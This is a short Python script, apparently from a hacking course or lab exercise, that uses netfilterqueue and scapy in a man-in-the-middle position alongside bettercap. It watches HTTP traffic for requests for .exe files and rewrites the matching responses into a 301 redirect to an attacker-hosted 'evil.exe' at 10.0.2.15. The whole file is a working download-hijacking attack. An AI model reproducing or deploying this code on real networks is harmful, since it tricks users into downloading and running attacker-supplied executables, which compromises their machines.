#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

ack_list = []
attack_load = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evil.exe\n\n"

def set_load(scapy_packet, load):
    print(f'[+] replacing file')
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 8080: #8080 for bettercap
            print(f'HTTP Request')
            if '.exe'.encode() in scapy_packet[scapy.Raw].load and "10.0.2.15".encode() not in scapy_packet[scapy.Raw].load:
                print(f'[+] txt Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 8080: #8080 for bettercap
            print(f'HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_scapy_packet = set_load(scapy_packet, attack_load)

                packet.set_payload(bytes(modified_scapy_packet))
                #print(scapy_packet.show())


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

